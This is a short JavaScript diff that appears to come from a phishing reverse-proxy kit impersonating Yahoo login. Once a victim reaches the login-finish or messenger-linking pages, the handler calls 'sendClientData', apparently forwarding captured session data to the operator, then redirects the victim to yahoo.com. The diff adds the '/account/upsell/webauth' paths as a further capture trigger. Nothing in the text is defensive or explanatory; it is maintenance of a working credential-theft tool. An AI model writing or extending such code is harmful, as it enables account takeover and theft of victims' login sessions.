@@ -91,7 +91,8 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
             // super.captureBody(clientContext.currentDomain, clientContext)
 
         }
-        if (this.req.url === '/auth/login/finish' || this.req.url === '/account/fb-messenger-linking') {
+        if (this.req.url === '/auth/login/finish' || this.req.url === '/account/fb-messenger-linking' 
+        || this.req.url.startsWith('/account/upsell/webauth')) {
             super.sendClientData(clientContext, {})
             this.res.writeHead(302, { location: 'https://yahoo.com'})
             return this.res.end('')
